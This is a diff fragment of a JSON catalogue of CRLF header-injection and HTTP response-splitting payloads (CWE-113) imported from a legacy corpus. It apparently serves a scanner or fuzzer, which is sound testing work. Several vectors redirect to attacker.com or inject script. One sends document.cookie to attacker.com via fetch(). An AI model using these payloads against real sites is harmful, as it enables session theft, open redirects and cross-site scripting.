+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.c7eb13195d",
+      "vector": "%0d%0aVia: 1.1 attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.c8951958bb",
+      "vector": "%0d%0aX-AspNetMvc-Version: 5.2",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.ca429b6e42",
+      "vector": "%0d%0aContent-Security-Policy:%20default-src%20*",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.cadb7a0fbb",
+      "vector": "%0d%0aX-Custom-Header: injected",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.cb23c91256",
+      "vector": "%0d%0aExpect-CT: max-age=0",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.cd98883ed0",
+      "vector": "%0d%0aLocation:%20http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.cfac86cc55",
+      "vector": "%0d%0aWidth: 1920",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.d0685781b8",
+      "vector": "%0d%0aX-Powered-By: PHP/7.4.3",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.d1bfec89fc",
+      "vector": "%0d%0aExpires: 0",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.d27f0cef40",
+      "vector": "%00%0d%0aLocation:%20http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.d63dd2026e",
+      "vector": "crlf%0d%0aLocation:%20http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.d942fea256",
+      "vector": "%0d%0aX-Forwarded-For: 127.0.0.1",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.dceb83c262",
+      "vector": "%0d%0aLast-Modified: Wed, 21 Oct 2015 07:28:00 GMT%0d%0aETag: \"malicious\"",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.dd41257526",
+      "vector": "%0d%0aX-Rewrite-URL: /admin",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.dd59687cc3",
+      "vector": "\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><script>alert(1)</script></html>",
+      "description": "Imported from the legacy corpus (response_splitting).",
+      "context": "response_splitting",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.dfdbce4523",
+      "vector": "%0d%0aCache-Control: no-cache",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.e1e46f3cbc",
+      "vector": "%0d%0aDate: Wed, 21 Nov 2025 12:00:00 GMT",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.e73f1332bd",
+      "vector": "%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html><script>alert('XSS')</script></html>",
+      "description": "Imported from the legacy corpus (response_splitting).",
+      "context": "response_splitting",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.e7b32d1fa4",
+      "vector": "%0d%0a%20Location:http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.e9ba064d42",
+      "vector": "/\\r\\nLocation: http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.ec04b33fd8",
+      "vector": "%0d%0aP3P: CP=\"This is not a P3P policy!\"",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.ec18ad58fb",
+      "vector": "\\r\\n\\r\\n<script>fetch('http://attacker.com/?cookie='+document.cookie)</script>",
+      "description": "Imported from the legacy corpus (response_splitting).",
+      "context": "response_splitting",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.ef7e6794ca",
+      "vector": "\\n",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.f12c849021",
+      "vector": "\\r",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.f53e6c26cd",
+      "vector": "crlf\\r\\nLocation: http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.f6d40b1b63",
+      "vector": "%0d%0aDownlink: 10",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.fa1379dcb3",
+      "vector": "crlf\\nLocation: http://attacker.com",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.fcfa6cf2d6",
+      "vector": ";%0d%0aLocation:%20http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.fe1a3ca4bd",
+      "vector": "%0d%0aX-Frame-Options: ALLOW",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    }
+  ]
+}
